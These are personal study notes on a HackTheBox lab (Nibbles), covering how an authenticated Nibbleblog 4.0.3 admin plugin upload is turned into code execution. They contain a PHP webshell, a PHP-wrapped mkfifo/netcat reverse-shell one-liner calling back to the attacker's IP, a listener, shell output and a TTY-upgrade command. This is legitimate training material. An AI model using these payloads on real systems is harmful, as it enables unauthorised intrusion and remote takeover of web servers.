- Since we need loggined into the admin  portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver
- We know that metasploit will likely work for this but lets gain access tot he admin portal for other avenues of attack looking around for a bit, we see the following pages:

- `Page`	 [Contents]
- `Publish`	[making a new post, video post, quote post, or new page. It could be interesting.]
- `Comments`	[shows no published comments]
- `Manage`	[Allows us to manage posts, pages, and categories. We can edit and delete categories, not overly interesting.]
- `Settings`	[Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available, but none seem valuable to us.]
- `Themes`	[This Allows us to install a new theme from a pre-selected list.]
- `Plugins`	[Allows us to configure, install, or uninstall plugins. The My image plugin allows us to upload an image file. Could this be abused to upload PHP code potentially?]

- this section we iwll attempt to use this to plugin a snippet of code which can be used for code execution

```php
<?php system('id'); ?>
```

- Save this code to a file and then click on the browse button and upload it 
- we get a bunch of errors but the file has been uploaded
- Now we have to find out where the file uploaded was successful or not 
- we would needs to go back to the directory `/content` directory. Under this there is a plugins directory and another sub directory for `my_image` 
- The  full path in this instance would be 
```http
http://<host>/nibbleblog/content/private/plugins/my_image/
```
- in this directory we see two files `db.xml` and `image.php` with a recent last modified date this means the upload was a success
```Shell-session
00818@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

-  Looks like we have command execution of the web server
- and we can see that the Apache server is running in the nibbler user context. 
- Let us modify our php file to obtain a reverse shell and start pokign around the server
- if we edit our PHP file we can upload it again and gain access to a reverse shell
- there are a lot reverse shell cheat sheets here are tow good ones [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) [highon,coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/) 
- we can use the followign bash command 
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```
- we now add our tun0 VPN IP address  in `<ATTACKING IP>` a placeholder  port for `<LISTENING PORT>` in order to catch the reverse shell on our `netcat` listener 
```PHP
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```
- Here is our modified PHP code 
- with this code we upload it again to start our netcat listener in our terminal
```shell-session
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
```
- That is the command
- we can cURL the image in firefox at `http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.`
```shell-session
00818@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

- Now that we have the reverse shell before we continue with further enumeration we must first upgrade our shell to make it a fully  interactive TTY since specific commands will not work 
- A lot wont be accessible until we `upgrade` it 
- Here is a site that explains how t o upgrade in further detail as well as having multiple methods [blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) 
- However in the HTB example the python method was used in order to spawn a psuedo-terminal so said specific commands can work
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
- I should try the various methods of upgrading of course use all of our resources 
- how ever in the HTB example the python method did not work 
```shell-session
$ python -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
```
- It didn't work since the python2 is missing 
- However python3 is working since the system states that python3 is available so just change it to python3
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- Then we browse to `/home/nibbler` where we find the `user.txt` flag and the zip file
```
shell-session
nibbler@Nibbles:/home/nibbler$ ls

ls
personal.zip  user.txt

```

[[challenge_nibblefoothold]]